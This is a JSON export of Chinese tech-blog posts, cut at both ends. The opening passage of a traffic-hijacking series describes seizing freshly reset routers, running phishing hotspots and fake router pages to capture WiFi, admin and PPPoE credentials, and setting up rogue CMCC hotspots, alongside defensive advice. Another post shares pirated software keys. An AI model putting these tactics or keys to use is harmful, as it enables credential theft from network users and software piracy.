是没有密码的，而且后台基本是弱口令。因此有个非常短暂的安全缝隙，能钻入这台设备并拿下他的网络！如果事先写好脚本，一旦发现有开放的热点，立即连上并且爆入后台，更是可以直接秒杀！对方刚恢复完路由器，还没回到电脑前就已被劫持了，这是无论如何也想不到的。。。 当然，为了防止他之后进入路由器改密码，你必须立即隐藏 SSID，让 Beacon 不再发出，这样大家都看不见这台设备了，只能通过 BSSID（路由器 MAC 地址）来连接。但是人家会有疑问，刚恢复好的路由器怎么看不见？这时得事先建立一个钓鱼热点，名字和那被隐藏的 SSID 一样，将对方引诱到自己的蜜罐上。 在这个蜜罐里开启一个和路由器页面差不多的站点（可以直接反向代理他路由器的页面），拖住用户，让你有充足的时间来操作那台被隐藏的真设备。甚至可以换掉他固件了！ 当然，有些设备不让轻易更新固件，需要输入路由器上的某个号码，或者按一个键才能开始。这时得发挥蜜罐站点的作用了，你可以在页面上画个文本框，提示他输入路由器上的那号码，或者直接让他去按那按钮。由于路由器后台太过专业，很少会有人质疑它的权威性，几乎都是按部就班。 事实上，你的蜜罐一直开着，对方肯定会在里面配置 WiFi 密码和管理密码，以及 PPPoE 账号。于是他的一切上网秘密都被掌控！即使不改他路由器也无所谓了，以后可以随时进入。 防范措施：不要轻易恢复路由器的出厂设置。真有必要请务必留神，尽快改掉默认密码。即使周围没有黑客，一些中毒的设备随时可能来连上并爆进后台窜乱。 软硬兼施，这招是不是太阴了？稍微用一点心理学或是社工，原本不怎么严重的漏洞可以扩大很多倍。 WLAN 基站钓鱼 前面说的热点钓鱼，只能在特定的场合下进行。劫持KFC的用户，只能在KFC附近；入侵小区的路由，只能在家完成。这极大的限制了攻击范围，完全没有发挥出无线网络的灵活性。 然而有一种网络，无论走到哪都能收到。打开手机，总能看见 CMCC 这类热点如同幽灵一般存在。如今，WLAN 业务已遍地开花，几乎覆盖了全国各地。它支持更高的频段，并向下兼容 WiFi，设备遍布全城，试图打造一个无线城域网。唯一的遗憾是收费的，而且信号也一般，远不如 3G 实用。 有时我们并没有连接这些热点，系统却自动连上了。原因很简单，之前某个时候手贱，去连过它们。而系统会保存主动连过的热点，再次出现时就自动上了。事实上，去连过这些热点的人不在少数。 不用说，你也想到开热点钓鱼了。并且用户几乎都是用 WiFi 来连接，也就没有必要使用 WLAN 设备。使用之前的大功率热点，取个 CMCC 的名字，放在阳台上对着大街，不一会就连上一堆用户了。要是支持虚 AP 的话，把 CMCC-AUTO，ChinaNet 等等这些名字全部用上，前来光临的就更多了。 上面提到了，不少设备连上 WiFi 后能自动弹网页，利用这个特性，钓鱼就更容易了。大多手机系统为了节省流量，当 WiFi 和 3G 同时可用时，会优先使用 WiFi，于是用户的流量不知不觉流到黑客那里。 事实上，我们还可以把整套钓鱼方案集成到安卓里。利用手机创建的热点吸引附近的用户，捕捉到的流量还可以通过自己的 3G 网络代理出去。使用 Linux 内核强大的转发机制，我们可以轻易的控制用户的各种流量。以后可别嘲笑街上低头玩手机的人，人家说不定正在劫持你呢。 不过，在一些地方例如地铁上面，3G 信号很差，难以将热点收到的数据转发出去，因此只能钓鱼无法劫持。这种单机模式是否仍能入侵呢？下篇文章将叙述，如何发起离线钓鱼。 防范措施：WiFi 不用就应及时关闭，以免自动连上不安全的热点。对于一些长期不用的连接记录，不如趁早删了吧。 安卓热点默认只支持 10 个用户，在街上开个叫 CMCC 的热点，会发现瞬间就连满了。所以还是把笔记本藏书包里，配几个好点的无线网卡，既隐蔽效果也好。大功率天线虽然很过瘾，但不能过度使用，说不定哪天就被查水表了~ 结尾 就谈到这里吧，这些只是之前尝试有效的案例，事实上还有太多的途径，要是再算上系统内部的方式那就无数了。但不论如何变化，流量劫持的最终利用方式几乎是如出一辙的 —— 利用它能做些什么呢？终极危害能有多大？请听下回分解。 原文:http://www.cnblogs.com/index-html/p/traffic-hijack.html 流量劫持系列文章目录: 流量劫持系列1_流量劫持_常见方法_是如何产生的? 流量劫持系列2_流量劫持能有多大危害? 流量劫持系列3_WiFi流量劫持_把笔记本改造成无线路由器_手机抓包 流量劫持系列4_WiFi流量劫持_浏览任意页面即可中毒！ 流量劫持系列5_WiFi流量劫持_JS脚本缓存投毒 流量劫持系列6_浮层登录框的隐患 流量劫持系列7_SSLStrip 的未来_HTTPS 前端劫持 流量劫持系列8_SSLStrip终极版_location瞒天过海 流量劫持系列9_沉默中的狂怒_Cookie 大喷发 流量劫持系列10_躲避HSTS的HTTPS劫持 流量劫持系列11_浅谈网站流量劫持防范措施","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"混技能","slug":"混技能","permalink":"https://sobaigu.com/tags/%E6%B7%B7%E6%8A%80%E8%83%BD/"}]},{"title":"LNMP环境-301域名重定向跳转-示例","slug":"lnmp-for-301","date":"2015-04-18T00:16:57.000Z","updated":"2024-09-28T00:17:21.255Z","comments":true,"path":"lnmp-for-301.html","permalink":"https://sobaigu.com/lnmp-for-301.html","excerpt":"","text":"经常折腾域名或服务器的人对301重定向不陌生, 有时候有需求把某目录整个重定向到一个二级域名,或者不带www的顶级域名请求全部重定向到带www的二级域名.如果是Apache，需要配置.htaccess，nginx不支持，需要在配置文件里面使用rewrite指令来实现。 在nginx中做301和在apache中用一点区别，这里需要利用server来做操作，有需要的朋友可看看。 先来看看关于 nginx 命令 last – 基本上都用这个Flag。 break – 中止Rewirte，不在继续匹配 redirect – 返回临时重定向的HTTP状态302 permanent – 返回永久重定向的HTTP状态301 这个问题都会在服务器的程序码出错时出现。 第一种情况：访问A站定向到B站 1server &#123; server_name www.a.com a.com www.b.com b.com; if ($host != &#x27;www.b.com&#x27; ) &#123; rewrite ^/(.)$ http://www.b.com/$1 permanent; &#125; ... &#125; 第二种情况：不是访问A站的全部重定向到指定页面 1server &#123; server_name www.A.com; if ($host != ‘A.com’ ) &#123; rewrite ^/(.)$ http://sobaigu.com/$1 permanent; &#125;...&#125; 如果写在第一个server段 使用IP访问时也将被重定向 第三种带WWW或者不带WWW之间的跳转 1server &#123; server_name sobaigu.com rewrite ^/(.)$ http://www.sobaigu.com/$1 permanent; &#125; nginx的rewrite相当于apache的rewriterule(大多数情况下可以把原有apache的rewrite规则加上引号就可以直接使用)，它可以用在server,location 和IF条件判断块中,命令格式如下： rewrite 正则表达式 替换目标 flag标记 flag标记可以用以下几种格式： last – 基本上都用这个Flag。 break – 中止Rewirte，不在继续匹配 redirect – 返回临时重定向的HTTP状态302 permanent – 返回永久重定向的HTTP状态301 例如下面这段设定nginx将某个目录下面的文件重定向到另一个目录,$2对应第二个括号(.*)中对应的字符串： 1location /download/ &#123; rewrite ^(/download/.)/m/(.)..$ $1/nginx-rewrite/$2.gz break; &#125; nginx重定向的IF条件判断在server和location两种情况下可以使用nginx的IF条件判断，条件可以为以下几种正则表达式如： 匹配判断 ~ 为区分大小写匹配; !~为区分大小写不匹配 ~* 为不区分大小写匹配； !~为不区分大小写不匹配 例如下面设定nginx在用户使用ie的使用重定向到/nginx-ie目录下： 1if ($http_user_agent ~ MSIE) &#123; rewrite ^(.*)$ /nginx-ie/$1 break; &#125; 文件和目录判断 -f和!-f判断是否存在文件 -d和!-d判断是否存在目录 -e和!-e判断是否存在文件或目录 -x和!-x判断文件是否可执行 例如下面设定nginx在文件和目录不存在的时候重定向： 1if (!-e $request_filename) &#123; proxy_pass http://127.0.0.1/; &#125; 总结，不管你是在Linux,nginx中还是在 Windows apache或iis中301这种操作不在万不得已千万别做，上面介绍了大部都是nginx中各个参数与说明及操作代码。 参考链接:http://www.php100.com/html/program/nginx/2013/0905/5496.html","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"博客建站","slug":"博客建站","permalink":"https://sobaigu.com/tags/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E7%AB%99/"}]},{"title":"Paragon Alignment Tool 4.0_专业版_硬盘4k无损对齐工具_支持SSD及机械硬盘","slug":"software-paragon-alignment-tool","date":"2015-04-11T06:41:00.000Z","updated":"2024-09-28T00:17:21.255Z","comments":true,"path":"software-paragon-alignment-tool.html","permalink":"https://sobaigu.com/software-paragon-alignment-tool.html","excerpt":"","text":"基本信息 程序类型：安装特别版 界面语言：中文英文 文件大小：89.8 m 支持系统：Windows 官方主页： 软件介绍 Paragon Alignment Tool 是一个专业的磁盘分区4K无损对齐工具，不用重新格式化分区即可无损直接对齐操作。它可用于检测并解决4K大小物理扇区高级格式化驱动(AF驱动)、稳定状态驱动(SSD)以及独立磁盘冗余阵列(RAID)中的对齐问题。使用Paragon Alignment Tool进行检测并重新对齐扇区能够确保系统和RAID的最佳表现性能，在SSD硬盘环境下还能延长其使用寿命。 Paragon Alignment Tool主要功能： 无需重启进行分区对齐操作 - 未锁定的分区可以在Windows中直接进行对齐。 蓝屏模式下的对齐操作 - 重启系统进入蓝屏模式，对正在使用的分区进行对齐操作。 通用恢复CD(RCD) - 在未安装PAT时Windows无法检测或对齐驱动时启动您的系统。 全部数据保护 - 在对齐操作忽然中断(比如电源中断)时，数据依旧能够获得保护。 为什么选择Paragon对齐工具4.0专业版？ 通过单一操作对齐分区的唯一工具 保证磁盘系统和数据的安全性 磁盘子系统的性能最高能提高到3倍 能够显著地增加SSD的使用寿命 对齐虚拟存储器和主机的分区 对齐超高性能4K扇区硬盘的分区 可调整对齐操作行为 在出现故障时会自动重启对齐操作 Paragon Alignment Tool 4.0 序列号 Product Key: PSG-253-PRE-CB-094343680 Serial Number: 09933-B0C6D-3B8E6-057FF 使用方法可见：Paragon Alignment Tool 4K对齐教程 下载地址 每列提取码与链接对应,如为空表示直接点进去链接不需要提取码,无链接则表示对应软件只需要提取码即可 项目 地址一 地址二 地址三 链接 百度网盘 备用网盘 BitTorrent Sync 提取码 hz3e","categories":[{"name":"搞软件","slug":"搞软件","permalink":"https://sobaigu.com/categories/%E6%90%9E%E8%BD%AF%E4%BB%B6/"}],"tags":[{"name":"晒酷软","slug":"晒酷软","permalink":"https://sobaigu.com/tags/%E6%99%92%E9%85%B7%E8%BD%AF/"},{"name":"精简绿色去广告版","slug":"精简绿色去广告版","permalink":"https://sobaigu.com/tags/%E7%B2%BE%E7%AE%80%E7%BB%BF%E8%89%B2%E5%8E%BB%E5%B9%BF%E5%91%8A%E7%89%88/"}]},{"title":"Linux命令行方式获取本机外网IP地址","slug":"get-wan-ip-in-shell","date":"2015-03-14T07:44:22.000Z","updated":"2024-09-28T00:17:21.255Z","comments":true,"path":"get-wan-ip-in-shell.html","permalink":"https://sobaigu.com/get-wan-ip-in-shell.html","excerpt":"","text":"如果是视窗界面,我们打开个浏览器,访问可以返回ip的网页就可以得到自己的外网ip,在Linux命令行终端上,我们可以使用curl命令,调用有ip返回的网络接口得到本机所处的外网ip. $ curl icanhazip.com $ curl ident.me $ curl ipecho.net/plain $ curl whatismyip.akamai.com $ curl tnx.nl/ip $ curl myip.dnsomatic.com $ curl ip.appspot.com $ curl -s checkip.dyndns.org | sed ‘s/.IP Address: ([0-9.]).*/\\1/g’ 有些网站的接口已不可用,以上请逐条试验. 转自：http://xmodulo.com/2013/04/how-to-find-the-public-ip-address-from-command-line.html","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://sobaigu.com/tags/Linux/"}]},{"title":"做产品经理_而不是功能经理","slug":"pm-not-a-fm","date":"2014-12-26T01:15:32.000Z","updated":"2024-09-28T00:17:21.255Z","comments":true,"path":"pm-not-a-fm.html","permalink":"https://sobaigu.com/pm-not-a-fm.html","excerpt":"","text":"产品设计分享 产品经理是个很奇怪的岗位，好像大多数人都能做，因为每个人对某个产品都有自己的看法，都能提出一些意见和想法，甚至能设计实现原理；也好像大多数人都做不好产品经理，因为互联网上成千上万个产品，大部分是垃圾，没几个产品是用户真心觉得很不错的。 我做产品经理，还不到两年，以前十来年一直在做技术。之前做技术的时候，我很看不上产品经理。当时想：产品经理自己什么都实现不了，每天就是提点想法，而且想法还经常不靠谱，如果哪天裁员，产品经理的位置最危险了；但等我转来做了产品经理，想法发生了根本的变化：嗯，产品经理太重要的，一个产品的未来就决定在产品经理身上。 你问我现在如何看待技术人员？嘿嘿，我现在觉得，技术就是一把刀，让它杀谁就杀谁！当然，这只是开玩笑。一个好的技术团队对于产品经理来说，那是相当重要。作为一个外行进入到这个领域，观察的角度也会不一样。这一年多下来，也找到一些感觉，发现周围的一些产品经理，容易走入一些误区，分享给大家。 做产品经理，而不是功能经理 这句话我最早是听天猫总裁逍遥子说的，当时没有感觉，现在发现非常有道理，因为周围太多的产品经理实际上是在做一名功能经理。 他们只是不停的在接产品功能需求，然后不停实现产品功能。缺登录，设计一个登录框；没有数据，找某个平台打通一下；管理不方便，设计一个工具来管理；页面不美观，重新规划一下页面结构…… 功能经理，每天都很忙，关注还有多少需求在后面排队，需求方是否得到满足。而用户体验到底如何，功能是否真的真有价值，是否可以更加完美，功能经理很少关心。当有人抱怨某个功能不爽的时候，他会说： 这个功能我已经有了啊，你说体验不太好？没办法，工程师资源太紧张啊，你说为啥设计的这么别扭？想起来就来气，大老板非要求这样啊，我们也只能这样设计，没办法！ 他经常表达的语气是他也不得已而为之，把责任都推到其他人身上。 然而做一个合格的产品经理，需要关注用户的体验，真正关注用户的反馈，关注数据的质量，关注每一个细节。就像买一双鞋一样，不只是能穿，还要考虑是否合脚，是否舒服，款式是否漂亮。 有一次开会，淘宝的总裁语嫣姐姐说了一句很朴素但很有道理的一句话：产品能用和好用完全不是一回事！ 实现产品需求，而不是用户需求 这个话题很有意思。当你问用户需要什么的时候，他会回答他需要一匹更快的马。乔布斯说，永远不要问用户想要什么！因为用户都是傻瓜，不知道自己想要什么。 这其实是产品经理经常把用户需求当成产品需求。对所有用户提出的，都是正确的，他们提的都是自己的期望，但不是产品需求。前些天有张小龙的采访，张小龙说他不看用户的数据。其实张小龙很关心用户的需求，我和张小龙在一个群里，如果有人在群里提一些微信使用不爽的功能，张小龙会很快给出反馈。 这些产品大神们，背后的意思是，不应该简单满足用户需求，而应该思考把用户需求提炼成产品需求。当一个产品的用户有上百万上千万的时候，产品需求的理解和提炼，就相当重要。 这个道理比较容易理解，不做多解释。 要锦上添花，而不是画蛇添足 互联网的发展，让很多互联网产品经理有个惯性：做产品迭代要快。快速上线，快速修改。这里也有误区，对于一些基本功能，确实要快速上线，快速迭代。因为有市场竞争，需要快速切入市场，获得用户。然而大部分的产品经理，没有机会从零开始设计一个新产品，大部分时候在现有的产品上做升级或优化。这时设计的很多功能，都是锦上添花的功能，还真不能太快。 锦上添花的功能，同样重要，会让产品更好玩，更有意思，更有特点。例如微信最早设计的摇一摇功能、朋友圈功能。微博的微刊功能、之前的送礼物的功能。 问题在于，锦上添花，添上去的一定是一朵花，说得俗一点，不能添上去是一坨屎。如果是后者，那么就有点画蛇添足了，或者成了鸡肋功能。 什么是一朵花？就是功能添加上去以后，会让用户眼前一亮。给人有“哇！！！”的感觉…… 遗憾的是淘宝搜索之前的很多功能添上去的都不是一朵花，上线了太多的画蛇添足的功能。这些功能一旦上线，就很难下线。因为当你产品的用户群有上亿的时候，再烂的一个功能，每天也会有几十万用户在使用。一旦你下线，会有很多人很不爽。 淘宝搜索的同店购就有点这个味道。技术实现成本高，体验一般，用的人也不多。有一段时间我们把这个功能隐藏起来了，有人在微博上说： 我现在最想做的事情，就是找把刀杀个淘宝搜索的产品经理来解解恨，我居然死活找不到我最常用的同店购了！ 画蛇添足的功能越多，让产品背负的垃圾就越多，造成好的功能没有资源做，差的功能又无法下线。 追求人性化，而不是追求完美 很多产品经理，追求完美。这是作为产品经理很好的品质，然而，有一点却经常被产品经理忽视，产品的人性化。 永远没有完美的产品，特别是当一个产品的用户量到达上百万上千万的时候。用户的喜好千差万别。如何让用户能喜欢产品的优点的同时能容忍产品的缺点？ 大家看选美大赛获胜的美女，经常会有感叹，为什么这么丑还能得前三啊！是因为评委的口味太特别？当然有一部分评委原因，但更多原因在于，大家每个人的审美观不一样。大家是把选美冠军作为一个完美的人来评判。 实际上，无论选出谁是冠军，都会有人觉得难看。任何一个产品，无论产品经理推出多么好用的功能，都会有人不喜欢！ 然而，大家对待周围的朋友，就不会用选美的标准要求他们，他们有明显的缺点，但也有很多值得欣赏的地方。大家订阅鬼脚七的微信，绝大部分人不会期望，鬼脚七每天的文章都会符合自己的口味。有人不看文章，只看看“7哥闲谈”也会觉得很有意思。为什么？因为大家不会期待鬼脚七这个账号是个完美的账号，把鬼脚七作为一个朋友在看待。鬼脚七有缺点，也有优点。 如果能让用户把我们的产品当成周围的朋友来看待呢？感觉会完全不一样。 淘宝有个做运营的同事有一天跟我感叹说：我忽然觉得攻城狮们离我好近，每个攻城狮内心都住着个诗人！我问为什么会忽然有这种感觉？她说有一天晚上，发现在淘宝内部一个TMS系统的标题栏上忽然多了一句话： 每个人的压力，少部分来自生存，大部分来自攀比。 就这一句话，让用户感觉到了产品背后的那位工程师。还记得微信有个版本的欢迎页面上的文字吗： 少发微信，多和朋友见见面！ 就这一句话，让我感觉到产品背后的那群人的心理活动。微信的一些小瑕疵，我也能容忍。 就是这句话，我喜欢上了微信。 人性化，是不是让产品开始有了灵魂？ 如何让产品更加人性化？如何让淘宝搜索更加人性化？是我最近一直在思考的问题。我定义2013年搜索的关键词：专业和有趣。希望2013年能让更多的人把淘宝搜索当成一个朋友，而不是一个工具。 写了这么多，回头看看我这篇文章，好像没有什么产品设计方法，只是一些思考，仅此而已。 来源：互联网分析沙龙 作者：鬼脚七","categories":[{"name":"瞎逼逼","slug":"瞎逼逼","permalink":"https://sobaigu.com/categories/%E7%9E%8E%E9%80%BC%E9%80%BC/"}],"tags":[{"name":"江湖","slug":"江湖","permalink":"https://sobaigu.com/tags/%E6%B1%9F%E6%B9%96/"}]},{"title":"mysql无法启动-ERROR! MySQL is running but PID file could not be found","slug":"mysql-is-running-but-pid-file-could-not-be-found","date":"2014-12-18T08:35:45.000Z","updated":"2024-09-28T00:17:21.255Z","comments":true,"path":"mysql-is-running-but-pid-file-could-not-be-found.html","permalink":"https://sobaigu.com/mysql-is-running-but-pid-file-could-not-be-found.html","excerpt":"","text":"访问自己的博客，提示&quot;建立数据库连接时出错&quot;，一时偷懒，把VPS索性重启了一把，结果登陆都成了问题… 千辛万苦远程连接上，查看mysql运行状态，发现是mysql异常了！ 12[root@localhost ~]#/etc/init.d/mysql statusERROR! MySQL is running but PID file could not be found 再看就发现原来是磁盘空间使用率100%了.VPS只用来搭建博客，所以不会有其他程序，一般是mysql和nginx日志，找到将之清理干净即可。 nginx 的日志文件，一般在/home/wwwlogs 文件夹里 mySQL日志文件，一般放在/usr/local/mysql/var文件里 先将nginx和mysql服务停止，然后将对应的log文件和mysql-bin.*清理干净，再启动对应服务，世界恢复正常。 在/usr/local/mysql/var目录中，默认会生成mysql-bin.000*等文件，这些文件大小动不动就以G计算，对于咱这种小博客站来说，不需要数据库同步，所以也自然没必要开启此项功能，不需要则将之关闭。 找到mysql的配置文件：/etc/my.cnf，将其中配置注销掉 123#Replication Master Server (default)#binary logging is required for replicationlog-bin=mysql-bin 最后结果为 123#Replication Master Server (default)#binary logging is required for replication#log-bin=mysql-bin 保存重启mysql，var目录下就不会生成一堆mysql-bin.000*文件了。","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"软件","slug":"软件","permalink":"https://sobaigu.com/tags/%E8%BD%AF%E4%BB%B6/"}]},{"title":"HotNewspro主题普通分类使用图片模板","slug":"WordPress-themes-hotnews-pic-module","date":"2014-11-18T09:21:41.000Z","updated":"2024-09-28T00:17:21.255Z","comments":true,"path":"WordPress-themes-hotnews-pic-module.html","permalink":"https://sobaigu.com/WordPress-themes-hotnews-pic-module.html","excerpt":"HotNewspro主题集成的自定义文章类型图片分类模板是一种类似九宫格的布局，有童鞋问普通日志分类可不可以使用该模板，答案是肯定的，也很简单。 下面是具体方法:","text":"HotNewspro主题集成的自定义文章类型图片分类模板是一种类似九宫格的布局，有童鞋问普通日志分类可不可以使用该模板，答案是肯定的，也很简单。 下面是具体方法: 一、打开HotNewspro主题目录的category-id.php模板文件，用下面的代码替换全部： 1234567891011121314151617181920&lt;?php include(&#x27;header_img.php&#x27;); ?&gt;&lt;div id=&quot;images_content&quot;&gt; &lt;div id=&quot;images_featured&quot;&gt; &lt;?php $posts = query_posts($query_string . &#x27;&amp;orderby=date&amp;showposts=16&#x27;);?&gt; &lt;?php while ( have_posts() ) : the_post(); ?&gt; &lt;div class=&quot;grid&quot;&gt; &lt;div class=&quot;top_t&quot;&gt; &lt;?php include(&#x27;includes/thumbnail.php&#x27;); ?&gt; &lt;/div&gt; &lt;div class=&quot;top_box&quot;&gt;&lt;a href=&quot;&lt;?php the_permalink(); ?&gt;&quot; rel=&quot;bookmark&quot; title=&quot;&lt;?php the_title_attribute(); ?&gt;&quot;&gt;详细内容&lt;/a&gt;&lt;/div&gt; &lt;div class=&quot;boxCaption&quot;&gt; &lt;h2&gt;&lt;a href=&quot;&lt;?php the_permalink(); ?&gt;&quot; title=&quot;Permalink to &lt;?php the_title(); ?&gt;&quot;&gt;&lt;?php echo cut_str($post-&gt;post_title,30); ?&gt;&lt;/a&gt;&lt;/h2&gt; &lt;/div&gt; &lt;/div&gt; &lt;?php endwhile;?&gt; &lt;div class=&quot;clear&quot;&gt;&lt;/div&gt; &lt;/div&gt; &lt;div id=&quot;pagenavi&quot;&gt;&lt;?php pagenavi(); ?&gt;&lt;/div&gt;&lt;/div&gt;&lt;?php get_footer(); ?&gt; 二、将category-id.php名称中的id改为某个分类的ID号，之后再次打开这个分类就会以九宫格布局展示内容。 **说明：**代码中的showposts=16数字是显示的篇数，可以根据需要修改。缩略图调用与其它普通日志相同。 点此查看演示 原文出处:http://zmingcx.com/hotnewspro-tu-pian-mo-ban.html","categories":[{"name":"做网站","slug":"做网站","permalink":"https://sobaigu.com/categories/%E5%81%9A%E7%BD%91%E7%AB%99/"}],"tags":[{"name":"WordPress","slug":"WordPress","permalink":"https://sobaigu.com/tags/WordPress/"}]},{"title":"Windows7下通过蓝牙手机拨号上网","slug":"connect-internet-with-bluetooth-phone-in-win7","date":"2014-11-13T03:25:31.000Z","updated":"2024-09-28T00:17:21.255Z","comments":true,"path":"connect-internet-with-bluetooth-phone-in-win7.html","permalink":"https://sobaigu.com/connect-internet-with-bluetooth-phone-in-win7.html","excerpt":"断网了，没条件拉网线，此地电信不来。。。人生总有很多无奈。某个时候需要应急了，我们可以选择用手机拨号上网。至于速度。。。这不是应急么，还苛求啥速度。当然，你手机屏幕足够大的话直接在手机上操作就好了，没必要搞那么麻烦连接电脑。","text":"断网了，没条件拉网线，此地电信不来。。。人生总有很多无奈。某个时候需要应急了，我们可以选择用手机拨号上网。至于速度。。。这不是应急么，还苛求啥速度。当然，你手机屏幕足够大的话直接在手机上操作就好了，没必要搞那么麻烦连接电脑。 要连接电脑拨号其实也很简单，因为科技发展到今天，一切都会变得简单。想俺在5年前买了个手机中的战斗机都还能连接电脑拨号上网呢。那时候流量贼贵了，3分钱每k，不得不用防火墙look and stop把除需要的程序外都拒绝联网，再配合net limiter监控好每一k流量，上得人不是一般的心疼。今天更先进点，通过蓝牙连接了。流量？貌似还是那么贵，不过5年啥东西都翻好几倍了，人家移动还没涨价，在天朝来说是十分厚道的。 废话不多说，开始正题，大家别期待有多精彩详细，因为我也只是记录下自己做过的，看了保准大家也都会。 本人手机是街机弱鸡鸭E71，算凑合吧，能有个手机用不错了，别太挑剔，其他手机也大同小异，依葫芦画瓢就哦啦。 要拨号上网当然第一步要让手机连接上电脑了。 匹配蓝牙设备 把手机蓝牙打开，匹配设备，或者在电脑上添加蓝牙设备，这个大家都会。要是无法匹配检查下是不是驱动不对，一般最新的系统兼容这种街机蓝牙是不成问题的，要实在不行就从官方下载个手机套件装上，驱动也就一并装好了。 如果可以连接的设备，在右下角的蓝牙托盘上右键》查看蓝牙设备就可以看到已经连接的蓝牙设备了，右键试试效果，如果正常的话是可以控制的。 创建拨号连接 右键控制点击后会跳转到一个设置页面，当然，这里就有我们希望的拨号连接网络的功能了，如下图所示。还可以把这个蓝牙设备当音频输出设备使用，喜欢捣鼓的可以看看效果。 点击“use your phone to connect to the internet”后面的“connect”（中文系统里翻译成啥？），什么都不用动，默认配置就可以，稍等片刻。恭喜你，拨号成功了。 打开手机看看效果。 在哪里看？当然是连接管理里了。。。 有木有看到个调制解调器？？ 这个就是电脑上拨号的连接了，是不是看到流量在嗖嗖嗖涨？ 嗯，速度还可以，最高可达到20kB/s，不要嫌慢，只是用来应急用，查个资料，聊个qq啥的足够了，建议不要用来拉空姐写真集什么的，虽然大家都有拉个片半个月的经历，但此处不宜有这样的耐心，因为这都是要银子的。 简单两步搞定通过手机上网问题,实现各位精神病患者的夙愿了,enjoy yourself! 声明:除注明的转载外,本博客文章皆为原创,欢迎大家转帖,但请注明原文出处,谢谢.","categories":[{"name":"玩系统","slug":"玩系统","permalink":"https://sobaigu.com/categories/%E7%8E%A9%E7%B3%BB%E7%BB%9F/"}],"tags":[{"name":"Windows","slug":"Windows","permalink":"https://sobaigu.com/tags/Windows/"}]},{"title":"用aardio自己动手做个股票交易计算器","slug":"aardio-stock-assistant","date":"2014-11-11T02:17:47.000Z","updated":"2024-09-28T00:17:21.255Z","comments":true,"path":"aardio-stock-assistant.html","permalink":"https://sobaigu.com/aardio-stock-assistant.html","excerpt":"折腾了个股票交易计算器,也可以计算融资融券交易获利情况,但技术水平有限,还做不了输入数据校验,还有很多不完善的地方,权当自娱自乐.","text":"折腾了个股票交易计算器,也可以计算融资融券交易获利情况,但技术水平有限,还做不了输入数据校验,还有很多不完善的地方,权当自娱自乐. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213import win.ui;import win.ui.atom;/*DSG&#123;&#123;*/mainForm = win.form(text=&quot;股票交易计算器&quot;;right=571;bottom=397;mode=&quot;popup&quot;)mainForm.add(button=&#123;cls=&quot;button&quot;;text=&quot;开始计算&quot;;left=449;top=353;right=553;bottom=383;ah=1;aw=1;font=LOGFONT(name=&#x27;微软雅黑&#x27;;h=-14);z=3&#125;;button2=&#123;cls=&quot;button&quot;;text=&quot;清空重填&quot;;left=324;top=353;right=428;bottom=383;ah=1;aw=1;font=LOGFONT(name=&#x27;微软雅黑&#x27;;h=-14);z=4&#125;;checkbox=&#123;cls=&quot;checkbox&quot;;text=&quot;深市&quot;;left=41;top=46;right=94;bottom=66;checked=1;font=LOGFONT(name=&#x27;微软雅黑&#x27;;h=-14);z=20&#125;;checkbox1=&#123;cls=&quot;checkbox&quot;;text=&quot;沪市&quot;;left=95;top=46;right=148;bottom=66;font=LOGFONT(name=&#x27;微软雅黑&#x27;;h=-14);z=19&#125;;checkbox2=&#123;cls=&quot;checkbox&quot;;text=&quot;融资年息&quot;;left=41;top=93;right=115;bottom=113;font=LOGFONT(name=&#x27;微软雅黑&#x27;;h=-14);z=21&#125;;checkbox3=&#123;cls=&quot;checkbox&quot;;text=&quot;融券年息&quot;;left=179;top=93;right=253;bottom=113;font=LOGFONT(name=&#x27;微软雅黑&#x27;;h=-14);z=22&#125;;edit=&#123;cls=&quot;edit&quot;;left=202;top=46;right=237;bottom=66;edge=1;font=LOGFONT(name=&#x27;微软雅黑&#x27;);z=5&#125;;edit2=&#123;cls=&quot;edit&quot;;left=86;top=138;right=156;bottom=158;edge=1;font=LOGFONT(name=&#x27;微软雅黑&#x27;);num=1;z=8&#125;;edit3=&#123;cls=&quot;edit&quot;;left=213;top=138;right=283;bottom=158;edge=1;font=LOGFONT(name=&#x27;微软雅黑&#x27;);z=10&#125;;edit4=&#123;cls=&quot;edit&quot;;left=341;top=138;right=411;bottom=158;edge=1;font=LOGFONT(name=&#x27;微软雅黑&#x27;);num=1;z=12&#125;;edit5=&#123;cls=&quot;edit&quot;;left=465;top=138;right=535;bottom=158;edge=1;font=LOGFONT(name=&#x27;微软雅黑&#x27;);z=13&#125;;edit6=&#123;cls=&quot;edit&quot;;left=254;top=93;right=289;bottom=113;edge=1;font=LOGFONT(name=&#x27;微软雅黑&#x27;);z=38&#125;;edit7=&#123;cls=&quot;edit&quot;;left=116;top=93;right=151;bottom=113;edge=1;font=LOGFONT(name=&#x27;微软雅黑&#x27;);z=40&#125;;edit8=&#123;cls=&quot;edit&quot;;left=374;top=93;right=409;bottom=113;edge=1;font=LOGFONT(name=&#x27;微软雅黑&#x27;);num=1;z=43&#125;;groupbox=&#123;cls=&quot;groupbox&quot;;text=&quot;输入信息&quot;;left=20;top=17;right=553;bottom=177;ah=1;aw=1;edge=1;font=LOGFONT(name=&#x27;微软雅黑&#x27;);z=1&#125;;groupbox2=&#123;cls=&quot;groupbox&quot;;text=&quot;计算结果&quot;;left=20;top=192;right=553;bottom=335;ah=1;aw=1;edge=1;font=LOGFONT(name=&#x27;微软雅黑&#x27;);z=2&#125;;static=&#123;cls=&quot;static&quot;;text=&quot;买入佣金=&quot;;left=212;top=219;right=286;bottom=244;font=LOGFONT(name=&#x27;微软雅黑&#x27;;h=-14);transparent=1;z=23&#125;;static10=&#123;cls=&quot;static&quot;;text=&quot;印花税=&quot;;left=40;top=259;right=115;bottom=283;font=LOGFONT(name=&